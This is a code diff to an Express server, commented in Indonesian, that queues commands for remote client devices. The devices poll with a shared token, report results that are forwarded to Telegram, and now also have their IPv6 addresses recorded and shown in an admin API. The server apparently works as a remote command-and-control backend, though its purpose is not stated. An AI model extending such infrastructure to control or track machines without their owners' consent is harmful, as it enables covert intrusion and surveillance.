@@ -46,7 +46,8 @@ let db;
             id TEXT PRIMARY KEY, 
             last_seen REAL DEFAULT 0,
             polling_mode TEXT DEFAULT 'turbo',
-            info TEXT
+            info TEXT,
+            ipv6 TEXT
         )`);
 
         await db.exec(`CREATE TABLE IF NOT EXISTS commands (
@@ -63,6 +64,7 @@ let db;
 
         // Tambah kolom jika dari versi sebelumnya belum ada
         try { await db.exec(`ALTER TABLE devices ADD COLUMN polling_mode TEXT DEFAULT 'turbo'`); } catch (e) { }
+        try { await db.exec(`ALTER TABLE devices ADD COLUMN ipv6 TEXT`); } catch (e) { }
         try { await db.exec(`ALTER TABLE commands ADD COLUMN chat_id TEXT`); } catch (e) { }
         try { await db.exec(`ALTER TABLE commands ADD COLUMN polling_mode TEXT DEFAULT 'normal'`); } catch (e) { }
         try { await db.exec(`ALTER TABLE commands ADD COLUMN message_id TEXT`); } catch (e) { }
@@ -97,11 +99,17 @@ app.set('views', path.join(__dirname, 'templates'));
 app.use('/public', express.static(path.join(__dirname, 'public')));
 
 // Helper function
-const updateDeviceSeen = async (deviceId, mode = 'normal') => {
+const updateDeviceSeen = async (deviceId, mode = 'normal', ipv6 = null) => {
     const timestamp = Date.now() / 1000;
     const finalMode = (mode === 'short' || mode === 'turbo') ? 'turbo' : 'normal';
-    await db.run('INSERT INTO devices (id, last_seen, polling_mode) VALUES (?, ?, ?) ON CONFLICT(id) DO UPDATE SET last_seen=excluded.last_seen, polling_mode=excluded.polling_mode',
-        [deviceId, timestamp, finalMode]);
+    
+    if (ipv6) {
+        await db.run('INSERT INTO devices (id, last_seen, polling_mode, ipv6) VALUES (?, ?, ?, ?) ON CONFLICT(id) DO UPDATE SET last_seen=excluded.last_seen, polling_mode=excluded.polling_mode, ipv6=excluded.ipv6',
+            [deviceId, timestamp, finalMode, ipv6]);
+    } else {
+        await db.run('INSERT INTO devices (id, last_seen, polling_mode) VALUES (?, ?, ?) ON CONFLICT(id) DO UPDATE SET last_seen=excluded.last_seen, polling_mode=excluded.polling_mode',
+            [deviceId, timestamp, finalMode]);
+    }
 };
 
 // Helper: Format Output JSON ke teks yang mudah dibaca (List Mode)
@@ -679,10 +687,10 @@ const notifyClient = (devId, cmd) => {
 
 // ... (di dalam endpoint /poll)
 app.get('/poll', async (req, res) => {
-    const { client_id, auth, mode } = req.query;
+    const { client_id, auth, mode, ipv6 } = req.query;
     if (auth !== AUTH_TOKEN) return res.status(403).json({ error: 'Unauthorized' });
 
-    await updateDeviceSeen(client_id, mode);
+    await updateDeviceSeen(client_id, mode, ipv6);
 
     const cmd = await db.get('SELECT * FROM commands WHERE device_id = ? AND status = ? ORDER BY created_at ASC LIMIT 1',
         [client_id, 'pending']);
@@ -718,11 +726,11 @@ app.get('/poll', async (req, res) => {
 
 
 app.post('/response', async (req, res) => {
-    const { client_id, auth } = req.query;
+    const { client_id, auth, ipv6 } = req.query;
     const data = req.body;
     if (auth !== AUTH_TOKEN) return res.status(403).json({ error: 'Unauthorized' });
 
-    await updateDeviceSeen(client_id);
+    await updateDeviceSeen(client_id, 'normal', ipv6);
 
     // Kloning objek agar modifikasi tidak merusak Telegram responder
     let logData = { ...data };
@@ -930,7 +938,8 @@ app.get('/admin/api/devices', async (req, res) => {
             id: d.id,
             last_seen: d.last_seen,
             is_online: (now - d.last_seen) < 90,
-            polling_mode: d.polling_mode || 'long'
+            polling_mode: d.polling_mode || 'long',
+            ipv6: d.ipv6
         }));
         res.json({ devices: devicesData });
     } catch (e) {
